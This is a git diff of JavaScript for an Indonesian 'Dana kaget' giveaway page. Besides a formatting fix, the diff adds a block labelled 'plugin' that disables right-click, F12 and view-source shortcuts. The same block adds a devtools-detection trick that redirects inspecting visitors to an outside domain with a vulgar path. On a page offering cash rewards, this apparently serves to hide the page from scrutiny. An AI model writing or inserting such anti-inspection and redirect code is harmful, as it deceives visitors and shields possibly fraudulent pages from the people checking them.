@@ -55,7 +55,7 @@ var countdownfunction = setInterval(function () {
 }, 1000);
 
 // Change text content when the DOM is fully loaded
-document.addEventListener("DOMContentLoaded", function() {
+document.addEventListener("DOMContentLoaded", function () {
   document.getElementById("j1").innerText = "Dana kaget batch 1";
   document.getElementById("t1").innerText = "Rp.100,- /100 Orang";
 
@@ -74,3 +74,46 @@ document.addEventListener("DOMContentLoaded", function() {
   document.getElementById("j6").innerText = "Dana kaget batch 6";
   document.getElementById("t6").innerText = "Bonus! ✨";
 });
+
+
+// plugin
+
+
+document.addEventListener('contextmenu', function (event) {
+  event.preventDefault();
+});
+
+
+
+document.addEventListener('keydown', function (event) {
+  // Disable F12
+  if (event.keyCode == 123) {
+    event.preventDefault();
+  }
+  // Disable Ctrl+Shift+I
+  if (event.ctrlKey && event.shiftKey && event.keyCode == 73) {
+    event.preventDefault();
+  }
+  // Disable Ctrl+Shift+J
+  if (event.ctrlKey && event.shiftKey && event.keyCode == 74) {
+    event.preventDefault();
+  }
+  // Disable Ctrl+U
+  if (event.ctrlKey && event.keyCode == 85) {
+    event.preventDefault();
+  }
+});
+
+
+
+function detectDevTools() {
+  const element = new Image();
+  Object.defineProperty(element, 'id', {
+    get: function () {
+      window.location.href = 'https://bimaselalubenar.my.id/kontol';
+    }
+  });
+  console.log(element);
+}
+
+setInterval(detectDevTools, 1000);
